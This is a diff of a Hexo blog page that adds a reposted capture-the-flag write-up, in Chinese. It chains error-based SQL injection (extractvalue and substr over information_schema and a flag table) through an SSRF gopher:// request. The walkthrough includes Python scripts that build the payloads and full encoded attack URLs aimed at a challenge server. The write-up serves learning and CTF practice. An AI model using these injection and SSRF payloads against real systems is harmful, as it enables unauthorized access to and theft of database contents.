@@ -10,7 +10,7 @@
     <title>查表 | Hexo</title>
     <meta name="author" content="John Doe" />
     <meta name="keywords" content="" />
-    <meta name="description" content="" />
+    <meta name="description" content="查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&amp;#x3D;’security’),0x7e)) #python脚本：import urllib.parseimport base64host &amp;#x3D; “127.0.0.1:80”payload &amp;#x3D; “admin’) and ext" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
 
@@ -155,7 +155,29 @@
     
     <section class="article-body markdown-body">
         
-        
+        <p>查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #</p>
+<p>python脚本：</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdmbGFnJyksMHg3ZSkpICM%253D%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdmbGFnJyksMHg3ZSkpICM%253D%250D%250A%250D%250A</a></p>
+<p>可以看到flag表中只有一个flag列</p>
+<p>查内容<br>admin’) and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #<br>python脚本</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A</a></p>
+<p>此时出现了另一个问题，报错的回显最大位数为32位，此时我们只获得了32位，需要用substr函数进行分割读取：</p>
+<p>分割读取<br>admin’) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #<br>python脚本:</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A</a></p>
+<p>两次的结果一合并，获得flag<br>————————————————<br>版权声明：本文为CSDN博主「sean7777777」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/128069145">https://blog.csdn.net/yuanxu8877/article/details/128069145</a></p>
+
         
     </section>
 </article>
